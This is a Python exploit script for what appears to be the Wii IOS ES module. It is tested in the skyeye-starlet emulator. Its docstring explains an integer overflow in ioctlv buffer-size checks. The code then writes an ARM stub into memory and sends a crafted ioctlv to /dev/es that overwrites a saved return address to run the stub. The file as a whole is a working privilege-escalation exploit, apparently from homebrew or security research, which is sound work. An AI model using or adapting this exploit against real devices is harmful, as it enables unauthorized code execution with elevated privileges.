#!/usr/bin/env python
""" get_titles.py - testing in `skyeye-starlet` 

Fullmetal5 found a bug in the ioctlv handler for ES_GetSharedContents().
The handler compares the number of entries against the expected size of 
the output buffer. It expects two arguments (1 in, 1 out) *expected* to 
be like this:

    typedef sha1 u8[0x14];

    arg[0].data = (u32*)num_entries;
    arg[0].size = 4;
    arg[1].data = (sha1*)out_buffer;
    arg[1].size = *(u32*)num_entries * sizeof(sha1)

The comparison in pseudo-code looks like this:

        size of buffer   num buffer entries    buffer entry size
            /                    |               \
           v                     v               v
    if ((arg[1]->size == *(int*)arg[0]->data * 0x14) && ...)

The computed buffer size may overflow to 0 if (*num_entries == 0x40000000).
This allows us to pass the handler's checks if we pass an output buffer with
a size of 0. The kernel thread used to handle PPC IPC does not validate any
untrusted pointers passed in vectors of size 0. 

Although it's difficult to trigger a useful codepath in ES_GetSharedContents,
it turns out that this bug exists in all ES module ioctlv handlers that compute
buffer sizes in the same way. An easier, trivially exploitable case occurs in
the handler for ES_GetTitles().

This is an 8-byte write primitive on ARM userland, triggered from unprivileged
PPC-land. I don't think you can directly corrupt kernel .text with this.
However, it'd be trivial to just reload the kernel from disk and patch it.

This corrupts memory by writing an 8-byte title ID (`0x00010001xxxxxxxx`).
I'm not actually sure what the low-order bytes are.

Currently, we're using the top 8-bytes to corrupt the saved LR in the handler
function for this ioctlv, dropping us to code at 0x00010000 in THUMB mode.

"""

import sys
import time
from ipc import *

STUB_ADDR       = 0x00010000
SAVED_LR_PTR    = 0x201125b0

NUM_ENTRIES     = 0x00000000
OUTPUT_LEN      = 0x00000000

# Read some ARM code into memory
with open("stub.bin", "rb") as f:
    stub_data = f.read()

# Connect to skyeye
print "[*] Waiting for IPC to start ..."
ipc = SkyeyeIPC()
ipc.init()
print "[*] IPC ready!"

# Write mock payload in skyeye MEM1
ipc.writemem(STUB_ADDR, stub_data)
print "[*] Wrote stub (%d bytes) to %08x" % (len(stub_data), STUB_ADDR)

# Get a handle to /dev/es
print "[*] Opening /dev/es ..."
fd = ipc.IOSOpen("/dev/es")
if (fd < 0):
    print "[!] Error opening ES, fd=%08x" % fd
    ipc.exit()
    sys.exit(1)
print "[!] es_fd=%d" % fd


# Build the output vector
bad_buffer = ipc.makebuf((OUTPUT_LEN, SAVED_LR_PTR))

# Sent ioctlv 0x0f
res = ipc.IOSIoctlv(fd, 0x0f, "i:d", NUM_ENTRIES, bad_buffer)
if res < 0:
    print "ioctlv 0x0f failed with %d" % res
    ipc.exit()
    sys.exit(1)
print "[!] sent ioctlv 0x0d"

ipc.IOSClose(fd)
ipc.exit()
sys.exit(0)
